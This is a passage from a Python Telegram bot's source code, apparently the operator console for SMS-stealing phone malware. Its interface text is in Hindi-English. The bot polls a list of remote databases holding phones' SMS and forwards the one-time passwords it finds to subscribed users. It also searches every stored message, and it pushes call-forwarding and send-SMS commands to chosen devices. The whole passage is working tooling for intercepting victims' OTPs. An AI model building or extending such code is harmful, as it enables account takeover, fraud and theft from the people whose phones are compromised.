            file_lines += ["", "❌ NAHI MILA (Not Found):"]
            for q in results_missing:
                file_lines.append(f"  {q}")

            file_bytes = "\n".join(file_lines).encode("utf-8")
            file_obj   = io.BytesIO(file_bytes)
            file_obj.name = "bulk_search_result.txt"
            await update.message.reply_document(
                document=file_obj,
                filename="bulk_search_result.txt",
                caption=f"📄 Full result — {found_c} mila, {miss_c} nahi mila",
            )
            return

        if action == "keyword_search_pipe":
            if not has_access(chat_id):
                await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML"); return
            keyword = text.strip().lower()
            if not keyword:
                await update.message.reply_text("❌ Keyword empty hai. Dobara bhejein.")
                return

            esc_kw   = html_escape(keyword)
            wait_msg = await update.message.reply_text(
                f"🔎 Keyword <code>{esc_kw}</code> ka sample dhundh raha hoon...\n⏳ Ek second...",
                parse_mode="HTML"
            )

            # ── Step 1: Sample preview — fetch SMS from first 20 devices only ──
            devices = await get_all_devices(is_admin)
            devices_with_nums = [d for d in devices if d.numbers]
            preview_devices   = devices_with_nums[:20]

            kw_sem = asyncio.Semaphore(10)
            async def fetch_sms_safe(d):
                async with kw_sem:
                    return await get_device_sms(d, limit=SMS_LIMIT)

            preview_results = await asyncio.gather(
                *(fetch_sms_safe(d) for d in preview_devices), return_exceptions=True
            )

            # Find first SMS that CONTAINS the keyword (sample to show user)
            sample_sms  = None
            sample_dev  = None
            sample_body = ""
            for d, smss in zip(preview_devices, preview_results):
                if isinstance(smss, Exception) or not smss: continue
                for sms in smss:
                    body = (sms.get("body") or sms.get("message") or sms.get("text") or "")
                    if keyword in body.lower():
                        sample_sms  = sms
                        sample_dev  = d
                        sample_body = body
                        break
                if sample_sms: break

            try: await wait_msg.delete()
            except: pass

            if not sample_sms:
                # No matching SMS found in first 20 devices → still let user confirm to run full search
                preview_text = (
                    f"🔎 <b>Keyword Preview: <code>{esc_kw}</code></b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"⚠️ Pehle 20 devices mein yeh keyword kisi SMS mein nahi mila.\n\n"
                    f"Phir bhi <b>poora search</b> chalana chahte hain?\n"
                    f"━━━━━━━━━━━━━━━━━━"
                )
            else:
                num_lbl    = sample_dev.numbers[0] if sample_dev.numbers else sample_dev.name
                sender     = sample_sms.get("sender", "Unknown")
                dt         = sms_date(sample_sms)
                # Highlight keyword in body
                highlighted = sample_body.replace(keyword, f"【{keyword}】")[:300]
                preview_text = (
                    f"🔎 <b>Keyword Preview: <code>{esc_kw}</code></b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📱 Number : {html_escape(num_lbl)}\n"
                    f"👤 From   : {html_escape(sender)}\n"
                    f"📅 Date   : {dt}\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"💬 <b>Message:</b>\n{html_escape(highlighted)}{'...' if len(sample_body) > 300 else ''}\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"✅ Kya yeh sahi match hai? Confirm karo tab poora search chalega."
                )

            # Store keyword for confirm step
            pending_kw_confirm[chat_id] = keyword

            confirm_kb = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ Haan, Poora Search Karo", callback_data=f"kw_confirm:{chat_id}"),
                    InlineKeyboardButton("❌ Cancel", callback_data=f"kw_cancel:{chat_id}"),
                ]
            ])
            await update.message.reply_text(preview_text, reply_markup=confirm_kb, parse_mode="HTML")
            return

        if action == "execute_cf":
            dev_id = act_data["dev_id"]
            devices = await get_all_devices(is_admin)
            device = next((d for d in devices if d.id == dev_id), None)
            if not device: return
            ok = await write_call_forward(device, text)
            await update.message.reply_text("✅ Call forward pushed!" if ok else "❌ Command failed.")
            return

        if action == "execute_ss":
            dev_id = act_data["dev_id"]
            devices = await get_all_devices(is_admin)
            device = next((d for d in devices if d.id == dev_id), None)
            if not device: return
            try:
                to_n, body_m = text.split(":", 1)
                ok = await write_send_sms(device, to_n.strip(), body_m.strip())
                await update.message.reply_text("✅ SMS sent!" if ok else "❌ Failed.")
            except:
                await update.message.reply_text("❌ Invalid format. Use: TARGET_NUMBER:MESSAGE")
            return

        if action == "add_bulk_db" and is_admin:
            success_count = invalid_count = duplicate_count = 0
            existing_urls = [url.strip().lower() for url in DATABASES.values()]
            newly_added = {}
            for line in text.split("\n"):
                line = line.strip()
                if not line or "=" not in line: invalid_count += 1; continue
                tag, url = line.split("=", 1)
                tag = tag.strip(); url = url.strip()
                if not (url.startswith("http://") or url.startswith("https://")):
                    invalid_count += 1; continue
                if url.lower() in existing_urls:
                    duplicate_count += 1; continue
                DATABASES[tag] = url; existing_urls.append(url.lower()); success_count += 1
                newly_added[tag] = url
            save_data()

            await update.message.reply_text(
                f"✅ Panel URLs Added!\n"
                f"✅ Added: {success_count}\n"
                f"🔁 Duplicates: {duplicate_count}\n"
                f"❌ Invalid: {invalid_count}\n\n"
                f"🔄 Naye panels ka data fetch ho raha hai..."
            )

            if newly_added:
                fetch_tasks = {tag: fetch_db_data(tag, url) for tag, url in newly_added.items()}
                results = await asyncio.gather(*fetch_tasks.values())
                for tag, devices in zip(fetch_tasks.keys(), results):
                    GLOBAL_DEVICE_CACHE[tag] = devices

                for tag, devices in zip(fetch_tasks.keys(), results):
                    if not devices:
                        await update.message.reply_text(
                            f"📡 <b>{tag}</b>\n📭 Koi device nahi mila is panel mein.",
                            parse_mode="HTML"
                        )
                        continue

                    online = sum(1 for d in devices if d.status == "online")
                    num_lines = [f"📡 <b>{tag}</b> — {len(devices)} devices, {online} online\n━━━━━━━━━━━━━━━━━━"]
                    num_count = 0
                    for i, d in enumerate(sorted(devices, key=lambda x: (0 if x.status == "online" else 1)), 1):
                        icon = "🟢" if d.status == "online" else "🔴"
                        batt = f" 🔋{d.battery}%" if d.battery else ""
                        if d.numbers:
                            nums_str = " | ".join(d.numbers)
                            num_lines.append(f"{i}. {icon} {nums_str}{batt}")
                            num_count += len(d.numbers)
                        else:
                            num_lines.append(f"{i}. {icon} ⚙️ {d.name[:20]}{batt}")
                    num_lines.append(f"━━━━━━━━━━━━━━━━━━\n📲 Total Numbers: {num_count}")

                    msg_text = "\n".join(num_lines)
                    if len(msg_text) > 4000:
                        await update.message.reply_text(msg_text[:4000], parse_mode="HTML")
                    else:
                        await update.message.reply_text(msg_text, parse_mode="HTML")
            return

        if action == "grant_access_pipe" and is_admin:
            try:
                target_id = int(text.strip())
                grant_access(target_id)
                udata = all_users.get(target_id, {})
                name = udata.get("name", "Unknown")
                await update.message.reply_text(f"✅ Access granted to {name} ({target_id})")
                try:
                    await ctx.bot.send_message(
                        target_id,
                        "✅ <b>Access Granted!</b>\n\nAapko bot use karne ki ijazat mil gayi.\n/start karein.",
                        parse_mode="HTML"
                    )
                except: pass
            except ValueError:
                await update.message.reply_text("❌ Sahi user ID daalein (sirf number).")
            return

        if action == "revoke_access_pipe" and is_admin:
            try:
                target_id = int(text.strip())
                revoke_access(target_id)
                await update.message.reply_text(f"❌ Access revoked for user {target_id}")
            except ValueError:
                await update.message.reply_text("❌ Sahi user ID daalein (sirf number).")
            return

        if action == "broadcast_msg" and is_admin:
            success = blocked = 0
            for uid in list(all_users.keys()):
                try:
                    await ctx.bot.send_message(chat_id=int(uid), text=f"📢 ADMIN BROADCAST\n\n{text}")
                    success += 1; await asyncio.sleep(0.05)
                except (Forbidden, TelegramError): blocked += 1
                except: pass
            await update.message.reply_text(f"✅ Broadcast done!\nSent: {success} | Blocked: {blocked}")
            return

    if text not in ("🛡 Admin Panel", "📊 Bot Status") and not is_admin:
        if not has_access(chat_id):
            await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML")
            return

    if text == "📱 Devices List":
        devices = await get_all_devices(is_admin)
        pg = user_page.get(chat_id, 0)
        await update.message.reply_text(
            device_list_header(devices, pg),
            reply_markup=device_list_keyboard(devices, pg),
            parse_mode="HTML"
        )
        return

    if text == "🗂 All Panels":
        visible_tags = [t for t in DATABASES if is_admin or t not in ADMIN_ONLY_TAGS]
        total_panels = len(visible_tags)
        total_devs = sum(len(GLOBAL_DEVICE_CACHE.get(t, [])) for t in visible_tags)
        grand_online = sum(
            sum(1 for d in GLOBAL_DEVICE_CACHE.get(t, []) if d.status == "online")
            for t in visible_tags
        )
        header = (f"🗂 <b>ALL PANELS</b>\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"📡 Panels: {total_panels}  |  📱 Devices: {total_devs}\n"
                  f"🟢 Online: {grand_online}  🔴 Offline: {total_devs - grand_online}\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"Panel pe click karo → us panel ke numbers dikhenge:")
        await update.message.reply_text(header, reply_markup=panels_list_keyboard(is_admin=is_admin), parse_mode="HTML")
        return

    if text == "🔍 Search Number":
        pending_action[chat_id] = {"action": "search_num_pipe"}
        await update.message.reply_text("🔍 Search karne ke liye number ya text bhejien:")
        return

    if text == "🔎 Keyword Search":
        pending_action[chat_id] = {"action": "keyword_search_pipe"}
        await update.message.reply_text(
            "🔎 <b>Keyword Search</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Woh keyword/text bhejein jo check karna hai.\n\n"
            "Bot saare numbers ke latest SMS check karega.\n"
            "Jis number ke SMS mein keyword <b>NAHI</b> hoga woh screen pe dikhega.\n"
            "Jis number ka koi SMS hi nahi — use skip kar dega.\n"
            "━━━━━━━━━━━━━━━━━━",
            parse_mode="HTML"
        )
        return

    if text == "🔍 Bulk Search":
        header = (
            "🔍 <b>BULK SEARCH — Panel Selector</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Panel select karo — sirf wahi numbers milenge jo:\n"
            "🟢 Online hain\n"
            "📅 Aaj / kal / parson OTP aaya ho\n"
            "━━━━━━━━━━━━━━━━━━"
        )
        await update.message.reply_text(header, reply_markup=bulksearch_panels_keyboard(), parse_mode="HTML")
        return

    if text == "📋 Number Search":
        pending_action[chat_id] = {"action": "bulk_search_pipe"}
        await update.message.reply_text(
            "📋 <b>Bulk Number Search</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Ek ya zyada numbers bhejein (enter, comma, ya space se alag):\n\n"
            "<i>Example:</i>\n"
            "<code>9876543210\n9123456789\n8800001234</code>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Bot sabhi panels mein search karega.",
            parse_mode="HTML"
        )
        return

    if text == "📊 Panel Status":
        lines = ["📊 <b>Panel Status</b>", "━━━━━━━━━━━━━━━━━━"]
        grand_total = grand_online = 0
        for tag in sorted(DATABASES.keys()):
            if not is_admin and tag in ADMIN_ONLY_TAGS: continue
            cached = GLOBAL_DEVICE_CACHE.get(tag, [])
            total  = len(cached)
            online = sum(1 for d in cached if d.status == "online")
            grand_total  += total
            grand_online += online
            bar = "🟢" if online > 0 else ("🔴" if total > 0 else "⚫")
            num_count = sum(len(d.numbers) for d in cached if d.numbers)
            lines.append(f"{bar} <b>{tag}</b> — Total: <code>{total}</code> | Online: <code>{online}</code> | Numbers: <code>{num_count}</code>")
        lines.append("━━━━━━━━━━━━━━━━━━")
        lines.append(f"📱 <b>Grand Total:</b> <code>{grand_total}</code> devices")
        lines.append(f"🟢 <b>Online:</b> <code>{grand_online}</code>  🔴 <b>Offline:</b> <code>{grand_total - grand_online}</code>")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return

    if text == "🔑 Recent OTPs":
        devices = await get_all_devices(is_admin)
        out_msg = "📋 Recent OTPs (Latest per Number):\n━━━━━━━━━━━━━━━━━━\n"

        def sms_ts(sm: dict) -> float:
            try:
                ts = float(sm.get("timestamp", 0))
                return ts / 1000 if ts > 1e11 else ts
            except: return 0.0

        devices = [d for d in devices if d.numbers]
        best: dict[str, tuple] = {}
        sms_tasks = await asyncio.gather(*(get_device_sms(d, limit=10) for d in devices))
        for d, smss in zip(devices, sms_tasks):
            num_label = d.numbers[0] if d.numbers else d.id[:10]
            for sm in smss:
                body = sm.get("body") or sm.get("message") or sm.get("text") or ""
                found = extract_otp(body)
                if not found: continue
                ts = sms_ts(sm)
                existing = best.get(num_label)
                if not existing or ts > existing[2]:
                    best[num_label] = (found, sm, ts)

        if not best: out_msg += "📭 Koi fresh OTP nahi mila."
        else:
            sorted_best = sorted(best.items(), key=lambda x: x[1][2], reverse=True)
            for num_label, (otp, sm, _) in sorted_best[:25]:
                out_msg += f"🔑 `{otp}` | {num_label} | {sms_date(sm)}\n"
        await update.message.reply_text(out_msg, parse_mode="Markdown")
        return

    if text in ("📊 Bot Status",) and is_admin:
        status_text = (f"📊 Bot Status\n━━━━━━━━━━━━━━━━━━\n"
                       f"🛰 Poll: `{POLL_INTERVAL}s`\n📦 SMS Limit: `{SMS_LIMIT}`\n"
                       f"⚡️ DBs: `{len(DATABASES)}`\n"
                       f"✅ Allowed Users: `{len(allowed_users)}`\n"
                       f"━━━━━━━━━━━━━━━━━━\n")
        total_nums = 0
        for tag in sorted(DATABASES.keys()):
            cached = GLOBAL_DEVICE_CACHE.get(tag, [])
            cnt = sum(len(d.numbers) for d in cached if d.numbers)
            total_nums += cnt
            status_text += f"{'🟢' if cnt > 0 else '🔴'} **{tag}:** `{cnt}` numbers\n"
        status_text += f"\n🎯 **Total:** `{total_nums}` numbers"
        await update.message.reply_text(status_text, parse_mode="Markdown")
        return

    if text == "🛡 Admin Panel" and is_admin:
        await update.message.reply_text(admin_panel_text(), reply_markup=admin_keyboard(), parse_mode="HTML")
        return

# ═══════════════════════════════════════════════════════
#  /STATUS COMMAND
# ═══════════════════════════════════════════════════════

_bot_start_time: float = time.time()

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS:
        await update.message.reply_text("🚫 Admin only."); return

    await update.message.reply_text("🔄 Checking DB health...")

    async def ping_db(tag: str, url: str) -> dict:
        start = time.time()
        try:
            session = await _get_session()
            async with session.get(f"{url}/.json?shallow=true", timeout=aiohttp.ClientTimeout(total=3)) as r:
                latency = int((time.time() - start) * 1000)
                cached = GLOBAL_DEVICE_CACHE.get(tag, [])
                return {"tag": tag, "alive": r.status == 200, "latency": latency,
                        "total": len(cached), "online": sum(1 for d in cached if d.status == "online")}
        except:
            return {"tag": tag, "alive": False, "latency": -1, "total": 0, "online": 0}

    results = await asyncio.gather(*(ping_db(tag, url) for tag, url in DATABASES.items()))
    uptime_sec = int(time.time() - _bot_start_time)
    h, rem = divmod(uptime_sec, 3600); m, s = divmod(rem, 60)
    lines = [
        "📊 <b>BOT STATUS</b>", "━━━━━━━━━━━━━━━━━━",
        f"⏱ Uptime: <code>{h}h {m}m {s}s</code>",
        f"🗄 DBs Alive: <code>{sum(1 for r in results if r['alive'])}/{len(results)}</code>",
        f"📱 Total Devices: <code>{sum(r['total'] for r in results)}</code>",
        f"🟢 Online: <code>{sum(r['online'] for r in results)}</code>",
        f"✅ Allowed Users: <code>{len(allowed_users)}</code>",
        "━━━━━━━━━━━━━━━━━━", "<b>DB Health:</b>",
    ]
    for r in sorted(results, key=lambda x: x["tag"]):
        lat = f"{r['latency']}ms" if r["latency"] >= 0 else "timeout"
        lines.append(f"{'🟢' if r['alive'] else '🔴'} <b>{r['tag']}</b> {lat} | {r['total']} devices | {r['online']} online")
    lines.append("━━━━━━━━━━━━━━━━━━")
    try: await update.message.reply_text("\n".join(lines), parse_mode="HTML")
    except: await update.message.reply_text("❌ Status error.")

# ═══════════════════════════════════════════════════════
#  REALTIME POLLING ENGINE
# ═══════════════════════════════════════════════════════

async def _forward_otp_only(device: Device, sms: dict) -> None:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body: return
    otp = extract_otp(body)
    if not otp: return

    msg_text = auto_forward_msg(sms, device_label(device))
    rows = [
        [InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")],
        [InlineKeyboardButton("📩 View Last 10 SMS", callback_data=f"msgs:{device.id}"),
         InlineKeyboardButton("ℹ️ Info", callback_data=f"info:{device.id}")],
    ]
    markup = InlineKeyboardMarkup(rows)

    if not _main_app: return

    is_admin_device = device.db_tag in ADMIN_ONLY_TAGS
    focused_users = [cid for cid, dev_id in user_focus.items() if dev_id == device.id]

    for cid in focused_users:
        if all_users.get(cid, {}).get("banned"): continue
        if not has_access(cid): continue
        if is_admin_device and cid not in ADMIN_IDS: continue
        try:
            await _main_app.bot.send_message(
                cid, msg_text, reply_markup=markup, parse_mode="HTML",
                read_timeout=5, write_timeout=5
            )
        except: pass

async def seed_seen_ids_for_db(url: str) -> None:
    try:
        r_main, r_user = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url))
        for bulk_data in (r_main, r_user):
            if isinstance(bulk_data, dict):
                for dev_id, sms_dict in bulk_data.items():
                    if isinstance(sms_dict, dict):
                        for k in sms_dict: seen_ids.add(seen_key(dev_id, k))
    except Exception: pass

async def poll_single_db(tag: str, url: str) -> None:
    try:
        r_main, r_user = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url))
        device_map = {d.id: d for d in GLOBAL_DEVICE_CACHE.get(tag, [])}
        for bulk_data in (r_main, r_user):
            if isinstance(bulk_data, dict):
                for dev_id, sms_dict in bulk_data.items():
                    if isinstance(sms_dict, dict) and dev_id in device_map:
                        for k in sms_dict:
                            skey = seen_key(dev_id, k)
                            if skey not in seen_ids:
                                seen_ids.add(skey)
                                if not first_run:
                                    await _forward_otp_only(device_map[dev_id], sms_dict[k])
    except: pass

async def poll_loop(app: Application) -> None:
    global first_run, _main_app, seen_ids
    _main_app = app
    gc_counter = 0
    sem = asyncio.Semaphore(DB_CONCURRENCY)

    async def _fetch_and_cache(tag: str, url: str):
        async with sem: GLOBAL_DEVICE_CACHE[tag] = await fetch_db_data(tag, url)

    async def _poll_one(tag: str, url: str):
        async with sem: await poll_single_db(tag, url)

    while True:
        try:
            db_items = list(DATABASES.items())
            t0 = time.time()
            await asyncio.gather(*(_fetch_and_cache(tag, url) for tag, url in db_items))
            fetch_time = round(time.time() - t0, 1)

            if not first_run:
                empty_tags = [tag for tag, url in db_items if len(GLOBAL_DEVICE_CACHE.get(tag, [])) == 0]
                if empty_tags:
                    for tag in empty_tags:
                        DATABASES.pop(tag, None)
                        GLOBAL_DEVICE_CACHE.pop(tag, None)
                    save_data()
                    tlog(f"Auto-removed {len(empty_tags)} zero-device DB(s): {', '.join(empty_tags)}")

            if first_run:
                await asyncio.gather(*(seed_seen_ids_for_db(url) for _, url in db_items))
                first_run = False
                tlog(f"Engine Online — {len(db_items)} DBs fetched in {fetch_time}s | {len(seen_ids)} existing SMS seeded")
            else:
                await asyncio.gather(*(_poll_one(tag, url) for tag, url in db_items))
                if len(seen_ids) > MAX_SEEN_IDS:
                    seen_ids = set(list(seen_ids)[-(MAX_SEEN_IDS // 2):])

            gc_counter += 1
            if gc_counter >= 5: gc.collect(); gc_counter = 0

        except Exception as e:
            tlog(f"Poll loop error: {e}")
        await asyncio.sleep(POLL_INTERVAL)

def main() -> None:
    print("═" * 56)
    print("  🤖 OTP PANEL BOT — ACCESS CONTROLLED EDITION")
    print("═" * 56)

    load_data()

    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("grant", cmd_grant))
    app.add_handler(CommandHandler("revoke", cmd_revoke))
    app.add_handler(CommandHandler("setadminpanel", cmd_setadminpanel))
    app.add_handler(CommandHandler("unsetadminpanel", cmd_unsetadminpanel))
    app.add_handler(CommandHandler("adminpanels", cmd_adminpanels))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))

    async def post_init(application: Application):
        asyncio.create_task(poll_loop(application))
        asyncio.create_task(auto_save_loop())

    app.post_init = post_init

    print(f"  Token: ...{TOKEN[-10:]}")
    print(f"  Allowed Users: {len(allowed_users)}")
    print(f"  DBs Loaded: {len(DATABASES)}")
    print("═" * 56)

    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()